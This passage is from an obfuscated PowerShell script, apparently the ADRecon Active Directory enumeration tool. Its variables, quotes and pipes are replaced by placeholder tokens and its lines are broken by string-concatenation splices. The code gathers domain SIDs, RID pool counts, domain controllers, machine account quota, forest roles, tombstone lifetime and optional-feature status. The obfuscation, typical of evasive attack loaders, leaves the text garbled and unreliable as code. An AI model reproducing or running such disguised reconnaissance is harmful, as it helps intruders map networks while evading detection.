                5I7ELobjSearchPath = New-Object System.DirectoryServices.DirectoryEntry I2ajLDAP://5I7EL(5I7ELDomainController)/5I7ELSearchPath,5I7EL(5I7ELobjDomain.distinguishedName)I2aj, 5I7ELCredential.UserName,5I7ELCredential.GetNetworkCredential().Password
                5I7ELobjSearcherPath = New-Object System.DirectoryServices.DirectorySearcher 5I7ELobjSearchPath
                5I7ELobjSearcherPath.PropertiesToLoad.AddRange((I2ajridavailablepoolI2aj))
                5I7ELobjSearcherResult = 5I7ELobjSearcherPath.FindAll()
                5I7ELRIDproperty = 5I7ELobjSearcherResult.Properties.ridavailablepool
                [int32] 5I7ELtotalSIDS = 5I7EL(5I7ELRIDproperty) / ([math]::Pow(2,32))
                [int64] 5I7ELtemp64val = 5I7ELtotalSIDS * ([math]::Pow(2,32))
                5I7ELRIDsIssued = [int32](5I7EL(5I7ELRIDproperty) - 5I7ELtemp64val)
                5I7ELRIDsRemaining = 5I7ELtotalSIDS - 5I7ELRIDsIssued
                Remove-Variable SearchPath
                5I7ELobjSearchPath.Dispose()
                5I7ELobjSearcherPath.Dispose()
                5I7ELobjSearcherResult.Dispose()
                Remove-Variable RIDproperty
                Remove-Variable totalSIDS
                Remove-Variable temp64val
            }
            Catch
            {
                Write-Warning I2aj[Get-ADRDomain] Error accessing CN=RID Manager5I7EL,CN=System,5I7EL(5I7ELSearchPath),5I7EL(5I7ELobjDomain.distinguishedName)I2aj
                Write-Verbose I2aj[EXCEPTION] 5I7EL(5I7EL_.Exception.Message)I2aj
            }
            Try
            {
                5I7ELForestContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext(I2ajForestI2aj,5I7EL(5I7ELADDomain.Forest),5I7EL(5I7ELCredential.UserName),5I7EL(5I7ELCredential.GetNetworkCredential().password))
                5I7ELADForest = [System.DirectoryServices.ActiveDirectory.Forest]::GetForest(5I7ELForestContext)
            }
            Catch
            {
                Write-Warning I2aj[Get-ADRDomain] Error getting Forest ContextI2aj
                Write-Verbose I2aj[EXCEPTION] 5I7EL(5I7EL_.Exception.Message)I2aj
            }
            If (5I7ELForestContext)
            {
                Remove-Variable ForestContext
            }
            If (5I7ELADForest)
            {
                5I7ELGlobalCatalog = 5I7ELADForest.FindGlobalCatalog()
            }
            If (5I7ELGlobalCatalog)
            {
                5I7ELDN = I2ajGC://5I7EL(5I7ELGlobalCatalog.IPAddress)/5I7EL(5I7ELobjDomain.distinguishedname)I2aj
                Try
                {
                    5I7ELADObject = New-Object -TypeName System.DirectoryServices.DirectoryEntry -ArgumentList (5I7EL(5I7ELDN),5I7EL(5I7ELCredential.UserName),5I7EL(5I7ELCredential.GetNetworkCredential().password))
                    5I7ELADDomainSID = New-Object System.Security.Principal.SecurityIdentifier(5I7ELADObject.objectSid[0], 0)
                    5I7ELADObject.Dispose()
                }
                Catch
                {
                    Write-Warning I2aj[Get-ADRDomain] Error retrieving Domain SID using the GlobalCatalog 5I7EL(5I7ELGlobalCatalog.IPAddress). Using SID from the ObjDomain.I2aj
                    Write-Verbose I2aj[EXCEPTION] 5I7EL(5I7EL_.Exception.Message)I2aj
                    5I7ELADDomainSID = New-Object System.Security.Principal.SecurityIdentifier(5I7ELobjDomain.objectSid[0], 0)
                }
            }
            Else
            {
                5I7ELADDomainSID = New-Object System.Security.Principal.SecurityIdentifier(5I7ELobjDomain.objectSid[0], 0)
            }
        }
        Else
        {
            5I7ELADDomain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
            5I7ELADForest = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
            Try
            {
                5I7ELGlobalCatalog = 5I7ELADForest.FindGlobalCatalog()
                5I7ELDN = I2ajGC://5I7EL(5I7ELGlobalCatalog)/5I7EL(5I7ELobjDomain.distinguishedname)I2aj
                5I7ELADObject = New-Object -TypeName System.DirectoryServices.DirectoryEntry -ArgumentList (5I7ELDN)
                5I7ELADDomainSID = New-Object System.Security.Principal.SecurityIdentifier(5I7ELADObject.objectSid[0], 0)
                5I7ELADObject.dispose()
            }
            Catch
            {
                Write-Warning I2aj[Get-ADRDomain] Error retrieving Domain SID using the GlobalCatalog 5I7EL(5I7ELGlobalCatalog.IPAddress). Using SID from the ObjDomain.I2aj
                Write-Verbose I2aj[EXCEPTION] 5I7EL(5I7EL_.Exception.Message)I2aj
                5I7ELADDomainSID = New-Object System.Security.Principal.SecurityIdentifier(5I7ELobjDomain.objectSid[0], 0)
            }
            
            Try
            {
                5I7ELRIDManager = ([ADSI]I2ajLDAP://CN=RID Manager5I7EL,CN=System,5I7EL(5I7ELobjDomain.distinguishedName)I2aj)
                5I7ELRIDproperty = 5I7ELObjDomain.ConvertLargeIntegerToInt64(5I7ELRIDManager.Properties.rIDAvailablePool.value)
                [int32] 5I7ELtotalSIDS = 5I7EL(5I7ELRIDproperty) / ([math]::Pow(2,32))
                [int64] 5I7ELtemp64val = 5I7ELtotalSIDS * ([math]::Pow(2,32))
                5I7ELRIDsIssued = [int32](5I7EL(5I7ELRIDproperty) - 5I7ELtemp64val)
                5I7ELRIDsRemaining = 5I7ELtotalSIDS - 5I7ELRIDsIssued
                Remove-Variable RIDManager
                Remove-Variable RIDproperty
                Remove-Variable totalSIDS
                Remove-Variable temp64val
            }
            Catch
            {
                Write-Warning I2aj[Get-ADRDomain] Error accessing CN=RID Manager5I7EL,CN=System,5I7EL(5I7ELSearchPath),5I7EL(5I7ELobjDomain.distinguishedName)I2aj
                Write-Verbose I2aj[EXCEPTION] 5I7EL(5I7EL_.Exception.Message)I2aj
            }
        }

        If (5I7ELADDomain)
        {
            5I7ELDomainObj = @()

            
            5I7ELFLAD = @{
	            0 = I2ajWindows2000I2aj;
	            1 = I2ajWindows2003/InterimI2aj;
	            2 = I2ajWindows2003I2aj;
	            3 = I2ajWindows2008I2aj;
	            4 = I2ajWindows2008R2I2aj;
	            5 = I2ajWindows2012I2aj;
	            6 = I2ajWindows2012R2I2aj;
	            7 = I2ajWindows2016I2aj
            }
            5I7ELDomainMode = 5I7ELFLAD[[convert]::ToInt32(5I7ELobjDomainRootDSE.domainFunctionality,10)] + I2ajDomainI2aj
            Remove-Variable FLAD

            5I7ELObjValues = @(I2ajNameI2aj, 5I7ELADDomain.Name, I2ajNetBIOSI2aj, 5I7ELobjDomain.dc.value, I2ajFunctional LevelI2aj, 5I7ELDomainMode, I2ajDomainSIDI2aj, 5I7ELADDomainSID.Value)

            For (5I7ELi = 0; 5I7ELi -lt 5I7EL(5I7ELObjValues.Count); 5I7ELi++)
            {
                5I7ELObj = New-Object PSObject
                5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name I2ajCategoryI2aj -Value 5I7ELObjValues[5I7ELi]
                5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name I2ajValueI2aj -Value 5I7ELObjValues[5I7ELi+1]
                5I7ELi++
                5I7ELDomainObj += 5I7ELObj
            }
            Remove-Variable DomainMode

            For(5I7ELi=0; 5I7ELi -lt 5I7ELADDomain.DomainControllers.Count; 5I7ELi++)
            {
                5I7ELObj = New-Object PSObject
                5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name I2ajCategoryI2aj -Value I2ajDomain ControllerI2aj
                5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name I2ajValueI2aj -Value 5I7ELADDomain.DomainControllers[5I7ELi]
                5I7ELDomainObj += 5I7ELObj
            }

            5I7ELObj = New-Object PSObject
            5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name I2ajCategoryI2aj -Value I2ajCreation DateI2aj
            5I7ELObj'+' Ok'+'6rl Add-Member -MemberType NoteProperty -Name I2ajValueI2aj -Value 5I7ELobjDomain.whencreated.value
            5I7ELDomainObj += 5I7ELObj

            5I7ELObj = New-Object PSObject
            5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name I2ajCategoryI2aj -Value I2ajms-DS-MachineAccountQuotaI2aj
            5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name I2ajValueI2aj -Value 5I7ELobjDomain.JQTOyms-DS-MachineAccountQuotaJQTOy.value
            5I7ELDomainObj += 5I7ELObj

            If (5I7ELRIDsIssued)
            {
                5I7ELObj = New-Object PSObject
                5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name I2ajCategoryI2aj -Value I2ajRIDs IssuedI2aj
                5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name I2ajValueI2aj -Value 5I7ELRIDsIssued
                5I7ELDomainObj += 5I7ELObj
                Remove-Variable RIDsIssued
            }
            If (5I7ELRIDsRemaining)
            {
                5I7ELObj = New-Object PSObject
                5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name I2ajCategoryI2aj -Value I2ajRIDs RemainingI2aj
                5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name I2ajValueI2aj -Value 5I7ELRIDsRemaining
                5I7ELDomainObj += 5I7ELObj
                Remove-Variable RIDsRemaining
            }
        }
    }

    If (5I7ELDomainObj)
    {
        Return 5I7ELDomainObj
    }
    Else
    {
        Return 5I7ELnull
    }
}

Function Get-ADRForest
{

    param(
        [Parameter(Mandatory = 5I7ELtrue)]
        [string] 5I7ELMethod,

        [Parameter(Mandatory = 5I7ELfalse)]
        [DirectoryServices.DirectoryEntry] 5I7ELobjDomain,

        [Parameter(Mandatory = 5I7ELfalse)]
        [DirectoryServices.DirectoryEntry] 5I7ELobjDomainRootDSE,

        [Parameter(Mandatory = 5I7ELfalse)]
        [string] 5I7ELDomainController,

        [Parameter(Mandatory = 5I7ELfalse)]
        [Management.Automation.PSCredential] 5I7ELCredential = [Management.Automation.PSCredential]::Empty
    )

    If (5I7ELMethod -eq JQTOyADWSJQTOy)
    {
        Try
        {
            5I7ELADDomain = Get-ADDomain
        }
        Catch
        {
            Write-Warning I2aj[Get-ADRForest] Error getting Domain ContextI2aj
            Write-Verbose I2aj[EXCEPTION] 5I7EL(5I7EL_.Exception.Message)I2aj
            Return 5I7ELnull
        }

        Try
        {
            5I7ELADForest = Get-ADForest 5I7ELADDomain.Forest
        }
        Catch
        {
            Write-Verbose I2aj[Get-ADRForest] Error getting Forest ContextI2aj
            Write-Verbose I2aj[EXCEPTION] 5I7EL(5I7EL_.Exception.Message)I2aj
        }
        Remove-Variable ADDomain

        If (-Not 5I7ELADForest)
        {
            Try
            {
                5I7ELADForest = Get-ADFor'+'est -Server 5I7ELDomainController
            }
            Catch
            {
                Write-Warning I2aj[Get-ADRForest] Error getting Forest Context using Server parameterI2aj
                Write-Verbose I2aj[EXCEPTION] 5I7EL(5I7EL_.Exception.Message)I2aj
                Return 5I7ELnull
            }
        }

        If (5I7ELADForest)
        {
            
            Try
            {
                5I7ELADForestCNC = (Get-ADRootDSE).configurationNamingContext
                5I7ELADForestDSCP = Get-ADObject -Identity I2ajCN=Directory Service,CN=Windows NT,CN=Services,5I7EL(5I7ELADForestCNC)I2aj -Partition 5I7ELADForestCNC -Properties *
                5I7ELADForestTombstoneLifetime = 5I7ELADForestDSCP.tombstoneLifetime
                Remove-Variable ADForestCNC
                Remove-Variable ADForestDSCP
            }
            Catch
            {
                Write-Warning I2aj[Get-ADRForest] Error retrieving Tombstone LifetimeI2aj
                Write-Verbose I2aj[EXCEPTION] 5I7EL(5I7EL_.Exception.Message)I2aj
            }

            
            If ([convert]::ToInt32(5I7ELADForest.ForestMode) -ge 6)
            {
                Try
                {
                    5I7ELADRecycleBin = Get-ADOptionalFeature -Identity I2ajRecycle Bin FeatureI2aj
                }
                Catch
                {
                    Write-Warning I2aj[Get-ADRForest] Error retrieving Recycle Bin FeatureI2aj
                    Write-Verbose I2aj[EXCEPTION] 5I7EL(5I7EL_.Exception.Message)I2aj
                }
            }

            
            If ([convert]::ToInt32(5I7ELADForest.ForestMode) -ge 7)
            {
                Try
                {
                    5I7ELPrivilegedAccessManagement = Get-ADOptionalFeature -Identity I2ajPrivileged Access Management FeatureI2aj
                }
                Catch
                {
                    Write-Warning I2aj[Get-ADRForest] Error retrieving Privileged Acceess Management FeatureI2aj
                    Write-Verbo'+'se I2aj[EXCEPTION] 5I7EL(5I7EL_.Exception.Message)I2aj
                }
            }

            5I7ELForestObj = @()

            
            5I7ELFLAD = @{
                0 = I2ajWindows2000I2aj;
                1 = I2ajWindows2003/InterimI2aj;
                2 = I2ajWindows2003I2aj;
                3 = I2ajWindows2008I2aj;
                4 = I2ajWindows2008R2I2aj;
                5 = I2ajWindows2012I2aj;
                6 = I2ajWindows2012R2I2aj;
                7 = I2ajWindows2016I2aj
            }
            5I7ELForestMode = 5I7ELFLAD[[convert]::ToInt32(5I7ELADForest.ForestMode)] + I2ajForestI2aj
            Remove-Variable FLAD

            If (-Not 5I7ELForestMode)
            {
                5I7ELForestMode = 5I7ELADForest.ForestMode
            }

            5I7ELObjValues = @(I2ajNameI2aj, 5I7ELADForest.Name, I2ajFunct'+'ional LevelI2aj, 5I7ELForestMode, I2ajDomain Naming MasterI2aj, 5I7ELADForest.DomainNamingMaster, I2ajSchema MasterI2aj, 5I7ELADForest.SchemaMaster, I2ajRootDomainI2aj, 5I7ELADForest.RootDomain, I2ajDomain CountI2aj, 5I7ELADForest.Domains.Count, I2ajSite CountI2aj, 5I7ELADForest.Sites.Count, I2ajGlobal Catalog CountI2aj, 5I7ELADForest.GlobalCatalogs.Count)

            For (5I7ELi = 0; 5I7ELi -lt 5I7EL(5I7ELObjValues.Count); 5I7ELi++)
            {
   '+'             5I7ELObj = New-Object PSObject
                5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name I2ajCategoryI2aj -Value 5I7ELObjValues[5I7ELi]
                5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name I2ajValueI2aj -Value 5I7ELObjValues[5I7ELi+1]
                5I7ELi++
                5I7ELForestObj += 5I7ELObj
            }
            Remove-Variable ForestMode

            For(5I7ELi=0; 5I7ELi -lt 5I7ELADForest.Domains.Count; 5I7ELi++)
            {
                5I7ELObj = New-Object PSObject
                5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name I2ajCategoryI2aj -Value I2ajDomainI2aj
                5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name I2ajValueI2aj -Value 5I7ELADForest.Domains[5I7ELi]
                5I7ELForestObj += 5I7ELObj
            }
            For(5I7ELi=0; 5I7ELi -lt 5I7ELADForest.Sites.Count; 5I7ELi++)
            {
                5I7ELObj = New-Object PSObject
                5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name I2ajCategoryI2aj -Value I2ajSiteI2aj
                5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name I2ajValueI2aj -Value 5I7ELADForest.Sites[5I7ELi]
                5I7ELForestObj += 5I7ELObj
            }
            For(5I7ELi=0; 5I7ELi -lt 5I7ELADForest.GlobalCatalogs.Count; 5I7ELi++)
            {
                5I7ELObj = New-Object PSObject
                5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name I2ajCategoryI2aj -Value I2ajGlobalCatalogI2aj
                5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name I2ajValueI2aj -Value 5I7ELADForest.GlobalCatalogs[5I7ELi]
                5I7ELForestObj += 5I7ELObj
            }

            5I7ELObj = New-Object PSObject
            5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name I2ajCategoryI2aj -Value I2ajTombstone LifetimeI2aj
            If (5I7ELADForestTombstoneLifetime)
            {
'+'                5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name I2ajValueI2aj -Value 5I7ELADForestTombstoneLifetime
                Remove-Variable ADForestTombstoneLifetime
            }
            Else
            {
                5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name I2ajValueI2aj -Value I2ajNot RetrievedI2aj
            }
            5I7ELForestObj += 5I7ELObj

            5I7ELObj = New-Object PSObject
            5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name I2ajCategoryI2aj -Value I2ajRecycle Bin (2008 R2 onwards)I2aj
  '+'          If (5I7ELADRecycleBin)
            {
                If (5I7ELADRecycleBin.EnabledScopes.Count -gt 0)
                {
                    5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name I2ajValueI2aj -Value I2ajEnabledI2aj
                    5I7ELForestObj += 5I7ELObj
                    For(5I7ELi=0; 5I7ELi -lt 5I7EL(5I7ELADRecycleBin.EnabledScopes.Count); 5I7ELi++)
                    {
                        5I7ELObj = New-Object PSObject
                        5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name I2ajCategoryI2aj -Value I2ajEnabled ScopeI2aj
                        5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name I2ajValueI2aj -Value 5I7ELADRecycleBin.EnabledScopes[5I7ELi]
                        5I7ELForestObj += 5I7ELObj
                    }
                }
                Else
                {
                    5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name I2ajValueI2aj -Value I2ajDisabledI2aj
                    5I7ELForestObj += 5I7ELObj
                }
                Remove-Variable ADRecycleBin
            }
            Else
            {
                5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name I2ajValueI2aj -Value I2ajDisabledI2aj
                5I7ELForestObj += 5I7ELObj
            }

            5I7ELObj = New-Object PSObject
            5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name I2ajCategoryI2aj -Value I2ajPrivileged Access Management (2016 onwards)I2aj
            If (5I7ELPrivilegedAccessManagement)
            {
                If (5I7ELPrivilegedAccessManagement.EnabledScopes.Count -gt 0)
                {
                    5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name I2ajValueI2aj -Value I2ajEnabledI2aj
                    5I7ELForestObj += 5I7ELObj
                    For(5I7ELi=0; 5I7ELi -lt 5I7EL(5I7ELPrivilegedAccessManagement.EnabledScopes.Count); 5I7ELi++)
                    {
                        5I7ELObj = New-Object PSObject
                        5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name I2ajCategoryI2aj -Value I2ajEnabled ScopeI2aj
                        5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name I2ajValueI2aj -Value 5I7ELPrivilegedAccessManagement.EnabledScopes[5I7ELi]
                        5I7ELForestObj += 5I7ELObj
                    }
    '+'            }
                Else
                {
         '+'           5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name I2ajValueI2aj -Value I2ajDisabledI2aj
                    5I7ELForestObj += 5I7ELObj
                }
                Remove-Variable PrivilegedAccessManagement
            }
            Else
            {
                5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name I2ajValueI2aj -Value I2ajDisabledI2aj
                5I7ELForestObj += 5I7ELObj
            }
            Remove-Variable ADForest
        }
    }

    If (5I7ELMethod -eq JQTOyLDAPJQTOy)
    {
        If (5I7ELCredential -ne [Management.Automation.PSCredential]::Empty)
        {
            5I7ELDomainFQDN = Get-DNtoFQDN(5I7ELobjDomain.distinguishedName)
            5I7ELDomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext(I2ajDomainI2aj,5I7EL(5I7ELDomainFQDN),5I7EL(5I7ELCredential.UserName),5I7EL(5I7ELCredential.GetNetworkCredential().password))
            Try
            {
                5I7ELADDomain = [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain(5I7ELDomainContext)
            }
            Catch
            {
                Write-Warning I2aj[Get-ADRForest] Error getting Domain ContextI2aj
                Write-Verbose I2aj[EXCEPTION] 5I7EL(5I7EL_.Exception.Message)I2aj
                Return 5I7ELnull
            }
            Remove-Variable DomainContext

            5I7ELForestContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext(I2ajForestI2aj,5I7EL(5I7ELADDomain.Forest),5I7EL(5I7ELCredential.UserName),5I7EL(5I7ELCredential.GetNetworkCredential().password))
            Remove-Variable ADDomain
            Try
            {
                5I7ELADForest = [System.DirectoryServices.ActiveDirectory.Forest]::GetForest(5I7ELForestContext)
            }
            Catch
            {
                Write-Warning I2aj[Get-ADRForest] Error getting Forest ContextI2aj
                Write-Verbose I2aj[EXCEPTION] 5I7EL(5I7EL_.Exception.Message)I2aj
                Return 5I7ELnull
            }
            Remove-Variable ForestContext

            
            Try
            {
                5I7ELSearchPath = I2ajCN=Directory Service,CN=Windows NT,CN=ServicesI2aj
                5I7ELobjSearchPath = New-Object System.DirectoryServices.DirectoryEntry I2ajLDAP://5I7EL(5I7ELDomainController)/5I7ELSearchPath,5I7EL(5I7ELobjDomainRootDSE.configurationNamingContext)I2aj, 5I7ELCredential.UserName,5I7ELCredential.GetNetworkCredential().Password
                5I7ELobjSearcherPath = New-Object System.DirectoryServices.DirectorySearcher 5I7ELobjSearchPath
                5I7ELobjSearcherPath.Filter=I2aj(name=Directory Service)I2aj
                5I7ELobjSearcherResult = 5I7ELobjSearcherPath.FindA'+'ll()
                5I7ELADForestTombstoneLifetime = 5I7ELobjSearcherResult.Properties.tombstoneLifetime
                Remove-Variable SearchPath
                5I7ELobjSearchPath.Dispose()
                5I7ELobjSearcherPath.Dispose()
                5I7ELobjSearcherResult.Dispose()
            }
            Catch
            {
                Write-Warning I2aj[Get-ADRForest] Error retr'+'ieving Tombstone LifetimeI2aj
                Write-Verbose I2aj[EXCEPTION] 5I7EL(5I7EL_.Exception.Message)I2aj
            }
            
            If ([convert]::ToInt32(5I7ELobjDomainRootDSE.forestFunctionality,10) -ge 6)
            {
                Try
                {
                    5I7ELSearchPath = I2ajCN=Recycle Bin Feature,CN=Optional Features,CN=Directory Service,CN=Windows NT,CN=Services,CN=ConfigurationI2aj
                    5I7ELobjSearchPath = New-Object System.DirectoryServices.DirectoryEntry I2ajLDAP://5I7EL(5I7ELDomainController)/5I7EL(5I7ELSearchPath),5I7EL(5I7ELobjDomain.distinguishedName)I2aj, 5I7ELCredential.UserName,5I7ELCredential.GetNetworkCredential().Password
                    5I7ELobjSearcherPath = New-Object System.DirectoryServices.DirectorySearcher 5I7ELobjSearchPath
                    5I7ELADRecycleBin = 5I7ELobjSearcherPath.FindAll()
                    Remove-Variable SearchPath
                    5I7ELobjSearchPath.Dispose()
                    5I7ELobjSearcherPath.Dispose()
                }
                Catch
                {
                    Write-Warning I2aj[Get-ADRForest] Error retrieving Recycle Bin FeatureI2aj
                    Write-Verbose I2aj[EXCEPTION] 5I7EL(5I7EL_.Exception.Message)I2aj
                }
            }
            
            If ([convert]::ToInt32(5I7ELobjDomainRootDSE.forestFunctionality,10) -ge 7)
            {
                Try
                {
                    5I7ELSearchPath = I2ajCN=Privileged Access Management Feature,CN=Optional Features,CN=Directory Service,CN=Windows NT,CN=Services,CN=ConfigurationI2aj
                    5I7ELobjSearchPath = New-Object System.DirectoryServices.DirectoryEntry I2ajLDAP://5I7EL(5I7ELDomainController)/5I7EL(5I7ELSearchPath),5I7EL(5I7ELobjDomain.distinguishedName)I2aj, 5I7ELCredential.UserName,5I7ELCredential.GetNetworkCredential().Password
                    5I7ELobjSearcherPath = New-Object System.DirectoryServices.DirectorySearcher 5I7ELobjSearchPath
                    5I7ELPrivilegedAccessManagement = 5I7ELobjSearcherPath.FindAll()
                    Remove-Variable SearchPath
                    5I7ELobjSearchPath.Dispose()
                    5I7ELobjSearcherPath.Dispose()
                }
                Catch
                {
                    Write-Warning I2aj[Get-ADRForest] Error retrieving Privileged Access Management FeatureI2aj
                    Write-Verbose I2aj[EXCEPTION] 5I7EL(5I7EL_.Exception.Message)I2aj
                }
            }
        }
        Else
        {
            5I7ELADDomain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
            5I7ELADForest = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()

            
            5I7ELADForestTombstoneLifetime = ([ADSI]I2ajLDAP://CN=Directory Service,CN=Windows NT,CN=Services,5I7EL(5I7ELobjDomainRootDSE.configurationNamingContext)I2aj).tombstoneLifetime.value

            
            If ([convert]::ToInt32(5I7ELobjDomainRootDSE.forestFunctionality,10) -ge 6)
            {
                5I7ELADRecycleBin = ([ADSI]I2ajLDAP://CN=Recycle Bin Feature,CN=Optional Features,CN=Directory Service,CN=Windows NT,CN=Services,CN=Configuration,5I7EL(5I7ELobjDomain.distinguishedName)I2aj)
            }
            
            If ([convert]::ToInt32(5I7ELobjDomainRootDSE.forestFunctionality,10) -ge 7)
            {
                5I7ELPrivilegedAccessManagement = ([ADSI]I2ajLDAP://CN=Privileged Access Management Feature,CN=Optional Features,CN=Directory Service,CN=Windows NT,CN=Services,CN=Configuration,5I7EL(5I7ELobjDomain.distinguishedName)I2aj)
            }
        }'+'

        If (5I7ELADForest)
        {
            5I7ELForestObj = @()

            
            5I7ELFLAD = @{
	            0 = I2ajWindows2000I2aj;
	            1 = I2ajWindows2003/InterimI2aj;
	            2 = I2ajWindows2003I2aj;
	            3 = I2ajWindows2008I2aj;
	            4 = I2ajWindows2008R2I2aj;
	            5 = I2ajWindows2012I2aj;
	            6 = I2ajWindows2012R2I2aj;
                7 = I2ajWindows2016I2aj
            }
            5I7ELForestMode = 5I7ELFLAD[[convert]::ToInt32(5I7ELobjDomainRootDSE.forestFunctionality,10)] + I2ajForestI2aj
            Remove-Variable FLAD

            5I7ELObjValues = @(I2ajNameI2aj, 5I7ELADForest.Name, I2ajFunctional LevelI2aj, 5I7ELForestMode, I2ajDomain Naming MasterI2aj, 5I7ELADForest.NamingRoleOwner, I2ajSchema MasterI2aj, 5I7ELADForest.SchemaRoleOwner, I2ajRootDomainI2aj, 5I7ELADForest.RootDomain, I2ajDomain CountI2aj, 5I7ELADForest.Domains.Count, I2ajSite CountI2aj, 5I7ELADForest.Sites.Count, I2ajGlobal Catalog CountI2aj, 5I7ELADForest.GlobalCatalogs.Count)

            For (5I7ELi = 0; 5I7ELi -lt 5I7EL(5I7ELObjValues.Count); 5I7ELi++)
            {
                5I7ELObj = New-Object PSObject
                5I7ELObj Ok6rl Add-Membe'+'r -MemberType NoteProperty -Name I2ajCategoryI2aj -Value 5I7ELObjValues[5I7ELi]
                5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name I2ajValueI2aj -Value 5I7ELObjValues[5I7ELi+1]
                5I7ELi++
                5I7ELForestObj += 5I7ELObj
            }
      '+'      Remove-Variable ForestMode

            For(5I7ELi=0; 5I7ELi -lt 5I7ELADForest.Domains.Count; '+'5I7ELi++)'+'
            {
                5I7ELObj = New-Object PSObject
                5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name I2ajCategoryI2aj -Value I2ajDomainI2aj
                5I7ELObj Ok6rl Add-Membe'+'r -MemberType NoteProperty -Name I2ajValueI2aj -Value 5I7ELADForest.Domains[5I7ELi]
                5I7ELForestObj += 5I7ELObj
            }
            For(5I7ELi=0; 5I7ELi -lt 5I7ELADForest.Sites.Count; 5I7ELi++)
            {
                5I7ELObj = New-Object PSObject
                5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name I2ajCategoryI2aj -Value I2'+'ajSiteI2aj
                5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name I2ajValueI2aj -Value 5I7ELADForest.Sites[5I7ELi]
                5I7ELForestObj += 5I7ELObj
            }
            For(5I7ELi=0; 5I7ELi -lt 5I7ELADForest.GlobalCatalogs.Count; 5'+'I7ELi++)
            {
                5I7ELObj = New-Object PSObject
                5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name I2ajCategoryI2aj -Value I2ajGlobalCatalogI2aj
                5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name I2ajValueI2aj -Value 5I7ELADForest.GlobalCatalogs[5I7ELi]
                5I7ELForestObj += 5I7ELObj
            }

            5I7ELObj = New-Object PSObject
            5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name I2ajCategoryI2aj -Value I2ajTombstone LifetimeI2aj
            If (5I7ELADForestTombstoneLifetime)
            {
                5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name I2ajValueI2aj -Value 5I7ELADForestTombstoneLifetime
                Remove-Variable ADForestTombstoneLifetime
            }
            Else
            {
                5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name I2ajValueI2aj -Value I2ajNot RetrievedI2aj
            }
            5I7ELForestObj += 5I7ELObj

            5I7ELObj = New-Object PSObject
            5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name I2ajCategoryI2aj -Value I2ajRecycle Bin (2008 R2 onwards)I2aj
            If (5I7ELADRecycleBin)
            {
                If (5I7ELADRecycleBin.Properties.JQTOymsDS-EnabledFeatureBLJQTOy.Count -gt 0)
                {
                    5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name I2ajValueI2aj -Value I2ajEnabledI2aj
                    5I7ELForestObj += 5I7ELObj
                    For(5I7ELi=0; 5I7ELi -lt 5I7EL(5I7ELADRecycleBin.Properties.JQTOymsDS-EnabledFeatureBLJQTOy.Coun'+'t); 5I7ELi++)
                    {
                        5I7ELObj = New-Object PSObject
                        5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name I2ajCategoryI2aj -Value I2ajEnabled ScopeI2aj
                        5I7ELObj Ok6rl Add-Member -MemberTy'+'pe NoteProperty -Name I2ajValueI2aj -Value 5I7ELADRecycleBin.Properties.JQTOymsDS-EnabledFeatureBLJQTOy[5I7ELi]
                        5I7ELForestObj += 5I7ELObj
                    }
                }
                Else
                {
                    5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name I2ajValueI2aj -Value I2ajDisabledI2aj
                    5I7ELForestObj += 5I7ELObj
                }
                Remove-Variable ADRecycleBin
            }
            Else
            {
                5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name I2ajValueI2aj -Value I2ajDisabledI2aj
                5I7ELForestObj += 5I7ELObj
            }

            5I7ELObj = New-Object PSObject
            5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name I2ajCategoryI2aj -Value I2ajPrivileged Access Management (2016 onwards)I2aj
